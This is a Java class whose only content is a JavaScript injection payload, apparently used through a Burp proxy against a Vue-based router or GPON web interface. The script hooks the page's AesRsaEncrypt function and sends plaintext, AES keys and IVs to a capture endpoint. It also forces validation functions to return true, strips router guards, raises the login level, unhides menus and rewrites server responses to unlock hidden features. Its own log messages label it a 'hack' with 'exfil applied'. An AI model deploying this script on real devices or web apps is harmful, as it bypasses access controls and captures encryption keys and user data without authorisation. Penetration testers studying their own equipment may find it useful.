class HookPayload {
    static final String HOOK_JS =
            "(() => {\n" +
                    "    const MAX_PREVIEW = 256;\n" +
                    "\n" +
                    "    function sendToBurp(payload) {\n" +
                    "        const json = JSON.stringify(payload);\n" +
                    "        const blob = new Blob([json], { type: 'application/json' });\n" +
                    "        if (navigator.sendBeacon && navigator.sendBeacon('/__capture__', blob)) return;\n" +
                    "        try { fetch('/__capture__', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: json }).catch(() => {}); return; } catch (_) {}\n" +
                    "        try { new Image().src = '/__capture__?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(json)))); } catch (_) {}\n" +
                    "    }\n" +
                    "\n" +
                    "    function preview(v) {\n" +
                    "        if (typeof v === 'string') return v.slice(0, MAX_PREVIEW);\n" +
                    "        try { return JSON.stringify(v).slice(0, MAX_PREVIEW); } catch { return String(v).slice(0, MAX_PREVIEW); }\n" +
                    "    }\n" +
                    "\n" +
                    "    function hookComponent(comp) {\n" +
                    "        if (!comp || typeof comp.AesRsaEncrypt !== 'function' || comp.__aesHooked__) return false;\n" +
                    "        comp.__aesHooked__ = true;\n" +
                    "        const _orig = comp.AesRsaEncrypt;\n" +
                    "        comp.AesRsaEncrypt = function(outObj, plainText, aesKeyB64, ivB64, wrapKey) {\n" +
                    "            const t0 = (self.performance && performance.now()) || Date.now();\n" +
                    "            const ret = _orig.apply(this, arguments);\n" +
                    "            try { sendToBurp({\n" +
                    "                ts: new Date().toISOString(),\n" +
                    "                url: location.href,\n" +
                    "                wrapKey: !!wrapKey,\n" +
                    "                ivB64, aesKeyB64,\n" +
                    "                plaintextLen: typeof plainText === 'string' ? plainText.length : 0,\n" +
                    "                plaintextPreview: preview(plainText),\n" +
                    "                plaintext: (function(p){ try { return (typeof p === 'string') ? p : JSON.stringify(p); } catch(e) { return String(p); } })(plainText),\n" +
                    "                out: {\n" +
                    "                    contentLen: (outObj && outObj.content && outObj.content.length) || 0,\n" +
                    "                    contentPreview: outObj?.content?.slice(0, 64) || null,\n" +
                    "                    keyB64: outObj?.key || null,\n" +
                    "                    ivB64: outObj?.iv || ivB64\n" +
                    "                },\n" +
                    "                stack: (new Error()).stack,\n" +
                    "                dt_ms: (((self.performance && performance.now()) || Date.now()) - t0)\n" +
                    "            }); } catch (_) {}\n" +
                    "            return ret;\n" +
                    "        };\n" +
                    "        console.log('[hook] AesRsaEncrypt hooked on', comp);\n" +
                    "        return true;\n" +
                    "    }\n" +
                    "\n" +
                    "    function scanAndHook() {\n" +
                    "        for (const el of document.querySelectorAll('*')) {\n" +
                    "            const vm = el.__vue__;\n" +
                    "            if (vm && typeof vm.AesRsaEncrypt === 'function') if (hookComponent(vm)) return true;\n" +
                    "        }\n" +
                    "        for (const el of document.querySelectorAll('*')) {\n" +
                    "            const ctx = el.__vueParentComponent?.ctx;\n" +
                    "            if (ctx && typeof ctx.AesRsaEncrypt === 'function') if (hookComponent(ctx)) return true;\n" +
                    "        }\n" +
                    "        return false;\n" +
                    "    }\n" +
                    "    if (!scanAndHook()) {\n" +
                    "        const timer = setInterval(() => { if (scanAndHook()) clearInterval(timer); }, 500);\n" +
                    "    }\n" +
                    "\n" +
                    "    function deepUnlock(obj) {\n" +
                    "        if (Array.isArray(obj)) {\n" +
                    "            return obj.map(deepUnlock);\n" +
                    "        } else if (obj && typeof obj === 'object') {\n" +
                    "            for (const k of Object.keys(obj)) {\n" +
                    "                if (typeof obj[k] === 'boolean') obj[k] = true;\n" +
                    "                else if (/VisibilityLevel$/i.test(k)) obj[k] = 3;\n" +
                    "                else if (obj[k] && typeof obj[k] === 'object') obj[k] = deepUnlock(obj[k]);\n" +
                    "                else if (obj[k] === undefined || obj[k] === null) obj[k] = {}; // fill to avoid undefined\n" +
                    "            }\n" +
                    "        }\n" +
                    "        return obj;\n" +
                    "    }\n" +
                    "\n" +
                    "    const root = document.getElementById('app')?.__vue__?.$root;\n" +
                    "    if (!root) return console.warn('No Vue root found');\n" +
                    "    const store  = root.$store;\n" +
                    "    const router = root.$router;\n" +
                    "    const VueProto    = root.__proto__.constructor.prototype;\n" +
                    "    const originalReq = VueProto.httpReqSendAndRecv;\n" +
                    "\n" +
                    "    for (const k of Object.keys(window)) if (/valid|check|verify/i.test(k) && typeof window[k] === 'function') window[k] = () => true;\n" +
                    "    document.addEventListener('submit', e => e.stopImmediatePropagation(), true);\n" +
                    "\n" +
                    "    function enableDebug() {\n" +
                    "        store.state.loginLevel = \"high\";\n" +
                    "        store.state.menu?.forEach(m => { m.hidden = false; m.submenu?.forEach(s => s.hidden = false); });\n" +
                    "\n" +
                    "        VueProto.httpReqSendAndRecv = function (opts = {}) {\n" +
                    "            return originalReq.call(this, opts).then(res => {\n" +
                    "                try { res = deepUnlock(res); } catch (e) { console.warn('Unlock error', e); }\n" +
                    "                if (opts.fnSuccess) setTimeout(() => opts.fnSuccess(res), 0);\n" +
                    "                if (opts.fnComplete) setTimeout(() => opts.fnComplete(res), 0);\n" +
                    "                return res;\n" +
                    "            });\n" +
                    "        };\n" +
                    "        root.$forceUpdate();\n" +
                    "    }\n" +
                    "\n" +
                    "    function disableDebug() {\n" +
                    "        VueProto.httpReqSendAndRecv = originalReq;\n" +
                    "        root.$forceUpdate();\n" +
                    "    }\n" +
                    "\n" +
                    "    router.beforeHooks.length = 0;\n" +
                    "    //router.resolveHooks.length = 0;\n" +
                    "    router.afterHooks.length = 0;\n" +
                    "\n" +
                    "    window.hack = { router, store, enableDebug, disableDebug };\n" +
                    "    console.log('hack ready — recursive unlock + exfil applied', { router, store });\n" +
                    "    console.log(\"Store and router are available by window.hack.store and window.hack.router\");\n" +
                    "    console.log(\"Use window.hack.router.push({ path: '/GPON', query: { debug: 1 } }) to change path. Guards are disabled.\");\n" +
                    "})();\n" +
                    "\n" +
                    "hack.enableDebug();\n";
}